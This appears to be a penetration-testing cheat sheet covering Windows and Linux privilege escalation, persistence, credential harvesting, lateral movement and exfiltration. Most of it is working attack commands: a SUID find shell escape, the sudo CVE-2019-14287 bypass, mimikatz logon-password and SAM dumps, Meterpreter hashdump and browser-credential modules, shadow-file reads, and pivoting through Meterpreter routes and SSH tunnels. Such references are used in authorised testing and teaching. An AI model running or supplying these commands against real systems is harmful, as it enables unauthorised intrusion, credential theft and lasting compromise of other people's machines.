Chapter 1: Windows Privilege Escalation

Windows systems offer multiple vectors for privilege escalation attacks

Windows privilege escalation involves exploiting misconfigurations, vulnerabilities, or design flaws to gain higher-level access rights within the operating system.

Kernel Exploits

Exploit operating system vulnerabilities for SYSTEM privileges:

systeminfo - Check OS version and patches

wmic qfe list - List installed updates

windows-exploit-suggester.py --database 2024-KB.xlsx --systeminfo systeminfo.txt

use post/multi/recon/local_exploit_suggester - Metasploit suggester

Service Exploits

Target misconfigured Windows services:

Unquoted Service Paths:

wmic service get name,displayname,pathname,startmode

Weak Service Permissions:

accesschk.exe -ucqv ServiceName
Registry Exploits

Exploit registry misconfigurations for privilege escalation:

reg query HKLM\SYSTEM\CurrentControlSet\Services - Service registry

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

accesschk.exe -uwqs Users c:\ - Check writable directories

Chapter 2: Linux Privilege Escalation

Linux systems require different approaches for privilege escalation

Linux privilege escalation typically targets SUID binaries, sudo misconfigurations, cron jobs, and kernel vulnerabilities to gain root access.

SUID/SGID Binaries

Find and exploit SUID binaries for privilege escalation:

find / -perm -u=s -type f 2>/dev/null - Find SUID files

find / -perm -g=s -type f 2>/dev/null - Find SGID files

ls -la /usr/bin/find - Check specific binary permissions

find /home -exec "/bin/sh" \; - Exploit find SUID

Sudo Exploitation

Exploit sudo misconfigurations and vulnerabilities:

sudo -l - List sudo privileges

sudo -u#-1 /bin/bash - CVE-2019-14287 exploit

sudo vim -c ':!/bin/sh' - Vim escape to shell

echo 'import os; os.system("/bin/sh")' > /tmp/script.py

Cron Job Exploitation

Target scheduled tasks for privilege escalation:

cat /etc/crontab - System crontab

ls -la /etc/cron* - Cron directories

crontab -l - User crontab

find /var/spool/cron -name '*' 2>/dev/null - User cron files

Chapter 3: Persistence Mechanisms

Persistence mechanisms ensure continued access to compromised systems

Persistence mechanisms allow attackers to maintain access to compromised systems across reboots, user logouts, and other system changes.

Windows Persistence

  • • Registry Run Keys: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  • • Startup Folder: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
  • • Services: Create malicious Windows services
  • • Scheduled Tasks: schtasks command for persistence
  • • WMI Events: Permanent WMI event subscriptions
  • • DLL Hijacking: Replace legitimate DLLs

Linux Persistence

  • • Cron Jobs: Scheduled task persistence
  • • Init Scripts: /etc/init.d/ service scripts
  • • Systemd Services: Modern service management
  • • Profile Scripts: .bashrc, .profile modifications
  • • SSH Keys: Authorized_keys backdoors
  • • Library Injection: LD_PRELOAD modifications

Chapter 4: Credential Harvesting

Credential harvesting reveals additional attack vectors and lateral movement opportunities

Credential harvesting involves extracting authentication information from compromised systems to facilitate lateral movement and privilege escalation.

Windows Credential Extraction

hashdump - Meterpreter hash extraction

load mimikatz - Load mimikatz in Meterpreter

sekurlsa::logonpasswords - Extract logon passwords

sekurlsa::wdigest - WDigest credential extraction

vault::cred - Windows credential manager

lsadump::sam - SAM database dump

Linux Credential Extraction

cat /etc/passwd - User account information

cat /etc/shadow - Password hashes (requires root)

find / -name "*.config" 2>/dev/null - Configuration files

history - Command history for credentials

find /home -name ".*history" 2>/dev/null - All history files

Browser Credential Extraction

run post/multi/gather/firefox_creds - Firefox credentials

run post/windows/gather/enum_chrome - Chrome data extraction

LaZagne.exe all - Multi-browser password recovery

Chapter 5: Lateral Movement

Lateral movement extends compromise across network infrastructure

Lateral movement involves using compromised systems as stepping stones to access additional network resources and expand the scope of compromise.

Network Pivoting Techniques

Meterpreter Pivoting

run autoroute -s 192.168.1.0/24 - Add route through session

use auxiliary/server/socks4a - SOCKS proxy server

portfwd add -l 3389 -p 3389 -r 192.168.1.100 - Port forwarding

SSH Tunneling

ssh -L 8080:internal-server:80 user@jumphost - Local port forward

ssh -R 9090:localhost:22 user@remote - Remote port forward

ssh -D 1080 user@proxy-server - Dynamic SOCKS proxy

Chapter 6: Data Exfiltration

Data exfiltration techniques demonstrate potential information theft capabilities

Data exfiltration demonstrates the potential for information theft and helps organizations understand their data protection weaknesses.

Traditional Channels

  • • HTTP/HTTPS: Web-based file transfer
  • • FTP/SFTP: File transfer protocols
  • • Email: Attachment-based exfiltration
  • • Cloud Storage: Dropbox, Google Drive uploads
  • • USB/Removable Media: Physical exfiltration
  • • Network Shares: SMB/NFS transfers

Covert Channels

  • • DNS Tunneling: Data in DNS queries
  • • ICMP Tunneling: Ping packet data
  • • Steganography: Hidden data in images
  • • Social Media: Data posted to platforms
  • • Chat Applications: Messaging platforms
  • • Blockchain: Data in transactions
